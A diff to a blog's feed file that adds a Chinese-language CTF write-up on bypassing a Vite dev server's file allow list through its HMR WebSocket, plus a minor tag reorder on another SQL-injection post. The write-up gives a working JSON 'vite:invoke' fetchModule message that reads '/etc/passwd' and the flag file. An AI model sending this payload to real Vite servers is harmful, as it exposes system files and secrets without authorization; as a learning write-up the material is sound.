@@ -4,6 +4,37 @@
   
   
   <entry>
+    <title>NEPCTF 2026 挂钩都在干什么呢？</title>
+    <link href="/2026/07/24/nepctf2026/"/>
+    <url>/2026/07/24/nepctf2026/</url>
+    
+    <content type="html"><![CDATA[<h2 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h2><p>给了附件，信息量挺大的。</p><p>先看 <code>robots.txt</code>，直接把路指出来了：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">User-agent: *<br>Disallow: /@fs/<br></code></pre></td></tr></table></figure><p><code>vite.config.js</code> 里写了白名单和黑名单：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">import</span> &#123; defineConfig &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vite&#x27;</span><br><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;node:path&#x27;</span><br><br><span class="hljs-keyword">const</span> root = process.<span class="hljs-title function_">cwd</span>()<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>(&#123;<br>  <span class="hljs-attr">server</span>: &#123;<br>    <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<br>    <span class="hljs-attr">port</span>: <span class="hljs-number">5173</span>,<br>    <span class="hljs-attr">strictPort</span>: <span class="hljs-literal">true</span>,<br><br>    <span class="hljs-attr">allowedHosts</span>: <span class="hljs-literal">true</span>,<br><br>    <span class="hljs-attr">fs</span>: &#123;<br>      <span class="hljs-attr">strict</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-attr">allow</span>: [<br>        root,<br>        path.<span class="hljs-title function_">join</span>(root, <span class="hljs-string">&#x27;src&#x27;</span>),<br>        path.<span class="hljs-title function_">join</span>(root, <span class="hljs-string">&#x27;public&#x27;</span>)<br>      ],<br>      <span class="hljs-attr">deny</span>: [<span class="hljs-string">&#x27;.env&#x27;</span>, <span class="hljs-string">&#x27;.env.*&#x27;</span>, <span class="hljs-string">&#x27;*.&#123;crt,pem&#125;&#x27;</span>, <span class="hljs-string">&#x27;**/.git/**&#x27;</span>]<br>    &#125;<br>  &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p><code>docker-entrypoint.sh</code> 把 flag 写到了 <code>/flag</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">set</span> -eu<br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$FLAG</span> &gt; /flag<br><span class="hljs-built_in">unset</span> FLAG<br><br><span class="hljs-built_in">chown</span> ctf:ctf /flag<br><span class="hljs-built_in">chmod</span> 777 /flag<br><br><span class="hljs-built_in">exec</span> su-exec ctf npm run start<br></code></pre></td></tr></table></figure><p>所以目标就是读 <code>/flag</code>，跟 <code>@fs</code> 的白名单硬碰。</p><h2 id="先试-HTTP"><a href="#先试-HTTP" class="headerlink" title="先试 HTTP"></a>先试 HTTP</h2><p>直接访问 <code>/@fs/flag</code>：</p><p><img src="/img/nepctf2026/QQ_1784903808523-20260724223658-f4t5m4u.png" alt="403 Restricted"></p><p>意料之中被拦了，allow list 只有 <code>/app</code>、<code>/app/src</code>、<code>/app/public</code>。</p><h2 id="转机在-WebSocket"><a href="#转机在-WebSocket" class="headerlink" title="转机在 WebSocket"></a>转机在 WebSocket</h2><p>回头翻了翻主界面，它自己就把 WebSocket 协议甩脸上了：</p><p><img src="/img/nepctf2026/QQ_1784903942722-20260724223906-uojmkcj.png" alt="主界面的 ws 地址"></p><p>Vite 6.4.1，查了一手 CVE，对上了 CVE-2026-39363（GHSA-p9ff-h696-f583）：</p><p><img src="/img/nepctf2026/QQ_1784904111607-20260724224159-d3z4ed7.png" alt="advisory"></p><p>漏洞说得很直白：HTTP 路径读文件被 allow list 挡住，但连上 HMR 的 WebSocket、不带 Origin，发一个 <code>vite:invoke</code> 调 <code>fetchModule</code>，文件内容会作为 JS module 返回。</p><h2 id="打通"><a href="#打通" class="headerlink" title="打通"></a>打通</h2><p>Burp 的 WebSocket 标签页连上去，直接发：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;custom&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;event&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;vite:invoke&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;fetchModule&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;send:test1&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;data&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/etc/passwd?raw&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>回包里 <code>code</code> 字段就是文件内容：</p><p><img src="/img/nepctf2026/QQ_1784905194255-20260724225959-6o1ncfy.png" alt="读 &#x2F;etc&#x2F;passwd"></p><p>换成 <code>/flag?raw</code>：</p><p><img src="/img/nepctf2026/QQ_1784905107497-20260724225841-uwf0zlj.png" alt="拿到 flag"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">flag&#123;an@1yZ1ng_p3rFeCt-6OOK-c1U6-3xper!3NC315e8&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Vite 上需要两个通道，是因为 HTTP 做不到「服务器主动通知浏览器」，所以另开了一个 WebSocket 通道做 HMR 推送。</p><p>这题只在 HTTP 上做了限制，WS 上畅通无阻，白名单等于单边生效。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF题解</category>
+      
+      <category>NEPCTF</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Writeup</tag>
+      
+      <tag>NEPCTF</tag>
+      
+      <tag>Vite</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>校内招新赛 Web 题解</title>
     <link href="/2026/04/15/campus-2025/"/>
     <url>/2026/04/15/campus-2025/</url>
@@ -165,11 +196,11 @@
     
     <tags>
       
+      <tag>SQL注入</tag>
+      
       <tag>MySQL</tag>
       
       <tag>堆叠注入</tag>
-      
-      <tag>SQL注入</tag>
       
     </tags>
     
